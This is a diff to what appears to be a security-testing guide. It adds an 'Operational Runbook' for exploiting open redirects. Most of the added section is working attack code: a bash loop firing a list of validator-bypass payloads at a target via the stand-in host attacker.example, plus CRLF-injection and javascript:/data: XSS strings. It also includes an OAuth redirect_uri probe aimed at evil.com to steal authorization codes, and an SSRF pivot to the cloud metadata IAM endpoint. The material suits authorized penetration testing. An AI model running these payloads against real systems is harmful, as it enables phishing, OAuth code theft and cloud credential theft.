@@ -121,6 +121,127 @@ Open redirects enable phishing, OAuth/OIDC code and token theft, and allowlist b
 1. Server-side link unfurler fetches `https://trusted.example/out?u=http://169.254.169.254/latest/meta-data`
 2. Redirect follows to metadata; confirm via timing/headers
 
+## Operational Runbook
+
+Once a URL param looks like it controls a redirect (`?next=`, `?redirect=`, `?return_to=`, `?callback=`), this is the canonical bypass library.
+
+### Step 1 — confirm baseline behavior
+
+```bash
+# Does the param control a redirect at all?
+curl -s -I "<TARGET>/login?next=/profile" | grep -i location
+
+# Does it accept a full URL or only paths?
+curl -s -I "<TARGET>/login?next=https://google.com" | grep -i location
+# If Location: https://google.com → open redirect, no bypass needed
+```
+
+### Step 2 — bypass library
+
+When the validator strips obvious external URLs, try each form. Run sequentially until one survives:
+
+```bash
+PARAM="next"
+TARGET="<TARGET>"
+EVIL="attacker.example"
+PAYLOADS=(
+    # Schemeless
+    "//${EVIL}"
+    "//${EVIL}/path"
+
+    # Backslash separator (Chrome/Edge follow `\\` as `/`)
+    "\\\\${EVIL}"
+    "/\\${EVIL}"
+
+    # @-userinfo trick (only the @-suffix is the actual host)
+    "https://trusted.example.com@${EVIL}"
+    "https://trusted.example.com#@${EVIL}"
+
+    # Double slashes / dots
+    "////${EVIL}"
+    ".${EVIL}"
+    "https:${EVIL}"
+    "https:/${EVIL}"
+
+    # URL encoding
+    "%2F%2F${EVIL}"
+    "/%2F${EVIL}"
+    "%5C%5C${EVIL}"
+
+    # Double URL-encoded
+    "%252F%252F${EVIL}"
+
+    # IDN homograph
+    "https://xn--80ak6aa92e.com"   # apple.com (Cyrillic) etc
+
+    # Whitespace bypass (some validators strip whitespace differently than browsers)
+    " https://${EVIL}"
+    "%09https://${EVIL}"   # tab
+    "%0Ahttps://${EVIL}"   # newline
+
+    # CR/LF injection (also tests header injection)
+    "/%0d%0aLocation:%20https://${EVIL}"
+
+    # Allowlist regex bypass — confusing the host parser
+    "https://trusted.example.com.${EVIL}"   # subdomain trick
+    "https://${EVIL}/?foo=trusted.example.com"   # query-string spoof
+
+    # Schemes other than http(s)
+    "javascript:alert(1)"
+    "data:text/html,<script>alert(1)</script>"
+)
+
+for p in "${PAYLOADS[@]}"; do
+    enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" <<< "$p")
+    loc=$(curl -s -I "${TARGET}/login?${PARAM}=${enc}" | grep -i '^location:')
+    if echo "$loc" | grep -qi "${EVIL}"; then
+        echo "[BYPASS] $p → $loc"
+    fi
+done
+```
+
+### Step 3 — multi-hop chain
+
+```bash
+# Combine a trusted-domain redirector with the open redirect on the target
+# Phishing chain:
+# 1. https://trusted.example.com/redirect?to=<TARGET>/login?next=//attacker
+# 2. → <TARGET>/login?next=//attacker (still trusted, browser allows)
+# 3. → //attacker (the open redirect fires here)
+# 4. → attacker captures referrer + any forwarded cookies
+```
+
+### Step 4 — OAuth-flow exploitation
+
+Open redirect in an OAuth `redirect_uri` is **critical** — it leaks authorization codes:
+
+```bash
+# Try a wildcard / loose redirect_uri match
+curl -s -L "https://idp.example.com/oauth/authorize\
+?client_id=$CLIENT&response_type=code\
+&redirect_uri=https://app.example.com.evil.com/cb" 
+
+# If the IdP accepts the suffix-confused redirect_uri,
+# the victim's code lands at attacker's server.
+```
+
+### Step 5 — internal-only egress chain (SSRF pivot)
+
+```bash
+# When the open redirect is on a server-side fetcher (e.g. link unfurler)
+curl -s "<TARGET>/unfurl?u=http://trusted.example.com/redirect?to=http://169.254.169.254/latest/meta-data/iam/"
+# Trusted-domain validation passes → redirect fires → fetches metadata
+```
+
+### Step 6 — record evidence
+
+Severity tiers:
+- **Critical** — open redirect in OAuth `redirect_uri` (auth-code leak); open redirect on server-side fetcher chained to SSRF
+- **High** — phishing chain (trusted domain → attacker page) when target's user-base is broadly phishable
+- **Medium** — single-hop redirect on a low-traffic path
+
+Document: baseline behavior, the bypass payload that worked, the resulting Location header, and the downstream attack the redirect enables.
+
 ## Testing Methodology
 
 1. **Inventory surfaces** - Login/logout, password reset, SSO/OAuth flows, payment gateways, email links
